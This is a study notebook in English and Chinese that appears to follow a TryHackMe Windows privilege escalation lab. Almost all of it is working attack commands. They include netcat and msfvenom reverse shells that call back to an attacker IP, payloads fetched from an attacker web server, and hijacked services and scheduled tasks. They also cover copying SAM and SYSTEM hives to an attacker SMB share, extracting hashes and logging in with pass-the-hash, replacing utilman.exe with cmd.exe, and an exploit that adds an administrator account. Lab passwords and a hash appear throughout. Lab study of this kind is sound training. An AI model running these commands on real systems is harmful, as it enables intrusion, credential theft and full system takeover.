## Windows Privilege Escalation : 
		--> User: thm-unpriv
		--> Password: Password321
		--> ip: 10.10.230.106
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> RDP :  
		--> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.230.106 /u:thm-unpriv /p:'Password321'
###  Unattended Windows Installations (無人值守的 Windows 安裝)
		--> 允許透過網路將單一作業系統映像部署到多台主機
		--> 可能儲存在 以下位置
			C:\Unattend.xml
			C:\Windows\Panther\Unattend.xml
			C:\Windows\Panther\Unattend\Unattend.xml
			C:\Windows\system32\sysprep.inf
			C:\Windows\system32\sysprep\sysprep.xml
			
		-->憑證:
			 <Credentials>
			    <Username>Administrator</Username>
			    <Domain>thm.local</Domain>
			    <Password>MyPassword123</Password>
			</Credentials>
###  Powershell 歷史
		--> cmd.exe : 
			--> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
		--> Powershell:
			--> type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
###  儲存的 Windows 憑證
		--> cmdkey /list
		--> runas /savecred /user:mike.katz cmd.exe
			=> that a shell 
			=> C:\Windows\system32>
				--> cd ../../Users/mike.katz/Desktop
###  Internet 資訊服務  (IIS )配置
		--> IIS Windows 安裝上的預設 Web 伺服器
		--> 檔案 : web.config
			--> C:\inetpub\wwwroot\web.config
			--> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
			--> 儲存資料庫的密碼或設定的身份驗證機制
		
		--> find database connection strings :
			=> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
		
###  從軟體檢索憑證：PuTTY
		--> PuTTY 是 Windows 系統上常見的 SSH 用戶端
		--> 儲存會話、儲存 IP、使用者和其他配置 : 
		--> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
			=> Simon Tatham 是 PuTTY 的創建者 //不是我們要檢索使用者名稱
###  Scheduled Tasks : 
		--> 查看目標系統上的排程任務
		--> schtasks : 可以使用不帶任何選項的命令從命令列列出計劃任務
			--> schtasks /query /tn(task name) vulntask /fo list /v 
				--> Task to Run : 指示計劃任務執行的內容
				--> Run As User : 顯示將使用的使用者執行任務
				--> if we are the runner => can move file (bash)
				
		--> icacls : 檢查可執行檔的檔案權限
			--> icacls c:\tasks\schtask.bat
				=> 完全存取權限 (F)
				--> 可以修改 .bat 檔案並插入我們喜歡的任何有效負載
				
		--> echo c:\tools\nc64.exe -e cmd.exe 10.11.92.230 4444 > c:\tasks\schtask.bat
			=> 啟動 : schtasks /run /tn vulntask
		--> kali : nc -lvp 4444
			=> C:\Windows\system32>
###  AlwaysInstallElevated (始終安裝提升)
		--> Windows 安裝程式檔案（也稱為 .msi 檔案）
		--> 產生一個以管理員權限執行的惡意 MSI 檔案
		
		--> 設定兩個註冊表值 : 
			--> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
			--> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
			
			--> 產生惡意 .msi 文件 (reverse shell)
			--> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
			--> 執行相應配置的Metasploit處理程序模組 => run
			--> C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
			
## Abusing Service Misconfigurations : 濫用服務錯誤配置
	=> C:\Windows\system32> 
	=> cmd : sc | Ps: sc.exe
### Windows Services : 
		--> Windows 服務由服務控制管理員(SCM)
			--> sc qc apphostsvc : 檢查 apphostsvc 服務配置
				=> BINARY_PATH_NAME   : 指定關聯的可執行檔
				=> SERVICE_START_NAME : 用於執行服務的帳戶
				
			--> 自主存取控制清單 (DACL) : 
				--> 誰有權啟動、停止、暫停、查詢狀態、查詢配置或重新配置服務以及其他權限
					--> Process Hacker <-- Desktop
					
			--> Process Hacker 
				=> svchost.exe => go to server 
				=> AppHostSvc => Properties => Security 
				--> 服務配置 : HKLM\SYSTEM\CurrentControlSet\Services\
	
###  Insecure Permissions on Service Executable (服務可執行檔案的不安全權限)
		--> Splinterware System Scheduler  
			--> 查詢服務 : sc qc WindowsScheduler
				=>  BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
			--> 檢查權限 : icacls C:\PROGRA~2\SYSTEM~1\WService.exe
				=> C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M) |  修改權限 (M)
			--> payload : 
				--> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.92.230 LPORT=4445 -f exe-service -o rev-svc.exe
			--> kali : 
				--> python3 -m http.server
				--> nc -lvp 4445 
			--> Powershell :
				-->  wget http://10.11.92.230:8000/rev-svc.exe -O rev-svc.exe
			--> cmd : 
				--> cd C:\PROGRA~2\SYSTEM~1\
				-->  將文件移至備份文件 : 
					--> move WService.exe WService.exe.bkp 
				--> 用反向 shell 替換它 and 重命名它
					--> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
				--> icacls WService.exe /grant Everyone:F //向Everyone群組授予完全權限
				
			--> 重啟 :s
				--> sc stop windowsscheduler
				--> sc start windowsscheduler
			
			--> cd ../../Users/svcusr1/Desktop 
				
###  Unquoted Service Paths (未加引號的服務路徑)
		--> 有空格 
			--> sc qc "vncserver"
				-->  正確 "C:\Program Files\RealVNC\VNC  
			--> sc qc "disk sorter enterprise"
				=> BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
				-->  易錯 : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
					=> C:\\MyPrograms\\Disk.exe 
					=> C:\\MyPrograms\\Disk Sorter.exe 
					=> C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe
					
			--> 檢查權限 : icacls c:\MyPrograms
				--> AD | WD權限 => 分別建立子目錄和檔案
					=> BUILTIN\Users:(I)(CI)(AD)
            				=> BUILTIN\Users:(I)(CI)(WD)
				
				
			--> payload : 
				--> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.92.230 LPORT=4446 -f exe-service -o rev-svc2.exe
			--> kali : 
				--> python3 -m http.server	
				--> nc -lvp 4446
			--> Powershell :
				-->  wget http://10.11.92.230:8000/rev-svc2.exe -O rev-svc2.exe
			--> cmd : 
				--> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
				--> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
				
			--> sc stop "disk sorter enterprise"
			--> sc start "disk sorter enterprise"
			
			--> cd ../../Users/svcusr2/Desktop
			
###  Insecure Service Permissions (不安全的服務權限)
		--> https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
		--> C:\\tools
		--> C:\tools\AccessChk> accesschk64.exe -qlc thmservice
		--> SERVICE_ALL_ACCESS 權限 : 這表示任何使用者都可以重新配置服務。
			--> payload : 
				--> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.92.230 LPORT=4447 -f exe-service -o rev-svc3.exe
			--> kali : 
				--> python3 -m http.server
				--> nc -lvp 4447 
			--> Powershell :
				-->  wget http://10.11.92.230:8000/rev-svc3.exe -O rev-svc3.exe
				--> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
				--> 變更服務關聯的可執行檔和帳 戶	
					--> sc.exe config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
				--> sc.exe stop THMService
				--> sc.exe start THMService
			
			--> cd ../../Users/Administrator/Desktop
## Abusing dangerous privileges :
	=> nt authority\system
###  Windows Privileges
		--> 檢查 權限 : whoami /priv
		
		--> 可用權限的完整清單 : https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
		--> 可利用權限的完整清單 : https://github.com/gtworek/Priv2Admin
### SeBackup 和 SeRestore 
		--> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.28.124 /u:THMBackup /p:'CopyMaster555'
		--> 權限允許使用者讀取和寫入系統中的任何文件
		--> 允許某些使用者從系統執行備份，而無需完全管理權限
		--> Run as administrator 「以管理員身份開啟」

		--> example : 
			--> SYSTEM : reg save hklm\system C:\Users\THMBackup\system.hive
			--> SAM    : reg save hklm\sam C:\Users\THMBackup\sam.hive
		
		--> kali : 	
			--> mkdir share
			--> 啟動一個帶有網路共享的簡單SMB伺服器 : 
				--> python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public1 share
		--> 將這兩個檔案傳輸 : 
			--> copy C:\Users\THMBackup\sam.hive \\10.11.92.230\public1\
			--> copy C:\Users\THMBackup\system.hive \\10.11.92.230\public1\
			
		--> kali : 
			--> cd /home/kali/share
			--> 使用 impacket 檢索使用者的密碼雜湊值 
				--> python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
		--> 使用管理員hash=> 獲得具有系統權限的存取權限：
			--> python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 Administrator@10.10.28.124
 
###  SeTakeOwnership (所有權)
		--> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.28.124 /u:THMTakeOwnership /p:'TheWorldIsMine2022'
		--> 允許使用者取得系統上任何物件的所有權，包括檔案和註冊表項
		
		--> 替換 utilman
			--> utilman.exe :
				--> 用於在鎖定螢幕期間提供「輕鬆存取」選項
				--> 以 SYSTEM 權限運行的
			--> 取得utilman的所有權
				--> takeown /f C:\Windows\System32\Utilman.exe
			--> 分配權限
				--> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
			--> 用 cmd.exe 的副本取代 utilman.exe
				--> copy cmd.exe utilman.exe
				
			--> 觸發 utilman，我們將從開始按鈕鎖定螢幕： (Lock)
				--> 按 "Ease of Access" button
###  SeImpersonate / SeAssignPrimaryToken
		-->允許進程模擬其他使用者並代表他們執行操作
		--> 1. 產生一個進程，以便使用者可以連接該進程並對其進行身份驗證，以進行模擬
		--> 2.找到一種方法來強制特權使用者連線並驗證產生的惡意進程
		
		--> 10.10.28.124
		--> RogueWinRM 漏洞
			--> Web shell 檢查受感染帳戶的分配權限
			--> whoami /priv
				=> SeAssignPrimaryToken
				=> SeImpersonateToken

			--> 連接埠 5985 通常用於 WinRM 服務
			--> 一個公開 Powershell 控制台以透過網路遠端使用的連接埠 (like ssh)
			
			--> nc -lvp 4442
			--> c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.11.92.230 4442"
				=> -p 要執行的exe | -a 傳遞參數
				
			--> cd ../../Users/Administrator/Desktop

## Abusing vulnerable software :
	--> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.144.74 /u:thm-unpriv /p:'Password321'
	
	--> Unpatched Software
		--> 列出目標系統上安裝的軟體及其版本 
			--> wmic product get name,version,vendor
			--> 搜索已安裝軟體的現有漏洞
			
###  Case Study: Druva inSync 6.6.3
		--> 以系統權限在連接埠 6064 上執行 RPC
		--> C:\tools\Druva_inSync_exploit.txt
		--> change the $cmd 
			=>  $cmd = "net user pwnd /add"
			=>  $cmd = "net user pwnd SimplePass123 /add & net localgroup Administrators pwnd /add"
				=> Username pwnd | Password : SimplePass123
		--> 使用 Powershell ISE :  upload 漏洞利用程式碼
			--> test (user PS >): net user pwnd 
				=> Local Group Memberships      *Administrators       *Users   
		--> type C:\Users\Administrator\Desktop\flag.txt
            
## Tools of the Trade :
	=> need 上傳到目標系統並在那裡運行它們  	
###  WinPEAS
		--> 用於列舉目標系統以發現權限提昇路徑的腳本
		--> https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
		--> cmd : 
			--> C:\> winpeas.exe > outputfile.txt
			
###  PrivescCheck :
		--> 是一個PowerShell腳本，用於搜尋目標系統上的常見權限升級
		--> https://github.com/itm4n/PrivescCheck
		--> PS :
			--> PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
			--> PS C:\> . .\PrivescCheck.ps1
			--> PS C:\> Invoke-PrivescCheck
			 		
### WES-NG: Windows Exploit Suggester - Next Generation
		--> 是一個 Python 腳本
		--> https://github.com/bitsadmin/wesng
		
		--> wes.py --update命令來更新資料庫
		--> systeminfo 需在目標系統上執行該命令 | cmd 
			--> systeminfo [/s <computer> [/u <domain>\<username> [/p <password>]]] [/fo {TABLE | LIST | CSV}] [/nh]
		--> 將輸出定向到您需要移動到攻擊電腦的 .txt 檔案
			--> user@kali$ wes.py systeminfo.txt
		
###  Metasploit :
		--> Meterpreter shell 
			--> multi/recon/local_exploit_suggester 
## command : 
	--> 權限 icacls : 
		--> https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
		--> F - 完全存取權限
		--> M - 修改存取權限
		--> AD - 追加資料/新增子目錄
		--> WD - 寫入資料/新增文件
		--> (I) - 繼承
		
	--> 授予權限 : 
		--> chmod 777 
		--> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F 
